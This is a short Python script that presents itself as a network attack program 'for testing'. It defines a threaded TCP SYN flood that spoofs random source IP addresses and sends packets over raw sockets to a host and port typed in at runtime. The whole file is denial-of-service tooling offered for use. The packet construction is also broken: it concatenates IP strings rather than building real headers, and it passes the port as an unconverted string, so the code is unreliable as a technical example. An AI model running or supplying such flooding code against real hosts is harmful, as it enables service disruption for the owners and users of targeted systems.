# Initial network attack python program for testing

import threading
import requests
import socket
import random
import time
from typing import Tuple

class DosAttacker:
    def __init__(self, target: str, port: int = 80, num_threads: int = 20, duration: int = 10):
        self.target = target
        self.port = port
        self.num_threads = num_threads
        self.duration = duration
        self.stop_attack = False

    def generate_random_ip(self) -> str:
        return f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"

    def tcp_flood(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        try:
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            end_time = time.time() + self.duration
            while time.time() < end_time and not self.stop_attack:
                src_ip = self.generate_random_ip()
                src_port = random.randint(1024, 65535)
                packet=(src_ip.encode()+self.target.encode()+src_port.to_bytes(2, 'big')+self.port.to_bytes(2, 'big')+(2).to_bytes(1, 'big'))
                try:
                    sock.sendto(packet, (self.target, self.port))
                    print(f"TCP SYN packet sent from {src_ip}:{src_port}")
                except Exception as e:
                    print(f"Failed to send TCP packet: {str(e)}")
                time.sleep(0.001)
        except Exception as e:
            print(f"Error in TCP flood: {str(e)}")
        finally:
            sock.close()

    def start_attack(self, attack_type):
        threads = []
        if attack_type.lower() in ["tcp"]:
            # Start TCP flood threads
            for _ in range(self.num_threads):
                t = threading.Thread(target=self.tcp_flood)
                t.daemon = True
                threads.append(t)
                t.start()
                print(f"Started TCP flood thread {_+1}")

        # Wait for all threads to complete
        for t in threads:
            t.join()

    def stop(self):
        """Stop the attack"""
        self.stop_attack = True


if __name__ == "__main__":
    TARGET_HOST = "" #put target here
    TARGET_PORT = 0
    THREAD_COUNT = 10
    DURATION = 30  #sec
    
    TARGET_HOST = input("Input host IP > ")

    TARGET_PORT = input("Input host port > ")

    try:
        attacker = DosAttacker(
            target=TARGET_HOST,
            port=TARGET_PORT,
            num_threads=THREAD_COUNT,
            duration=DURATION
        )
        print(f"Starting DoS attack against {TARGET_HOST}:{TARGET_PORT}")
        attacker.start_attack(attack_type="tcp")
        
    except KeyboardInterrupt:
        print("\nAttack stopped by user")
        attacker.stop()
    except Exception as e:
        print(f"Attack failed: {str(e)}")